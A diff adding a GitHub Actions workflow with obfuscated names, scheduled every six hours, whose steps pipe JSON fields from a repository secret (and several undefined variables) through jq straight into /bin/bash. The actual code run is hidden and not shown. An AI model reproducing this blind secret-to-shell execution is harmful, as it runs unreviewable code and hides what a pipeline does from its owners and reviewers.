@@ -1,0 +1,23 @@
+name: weichanghui7164
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: weichanghui7164
+        env:
+          gsqd139: ${{ secrets.gsqd139 }}
+        run: |
+          echo $gsqd139 | jq -r .fa1832 | /bin/bash
+          echo $kfqm426 | jq -r .rj2 | /bin/bash
+          echo $boelf19845 | jq -r .uzd878 | /bin/bash
+          echo $qy006 | jq -r .hhkj422 | /bin/bash
+          echo $vhqub3943 | jq -r .f78299 | /bin/bash
+          echo $fcs966 | jq -r .yye24 | /bin/bash
+          echo $xko1089 | jq -r .qf89 | /bin/bash
+
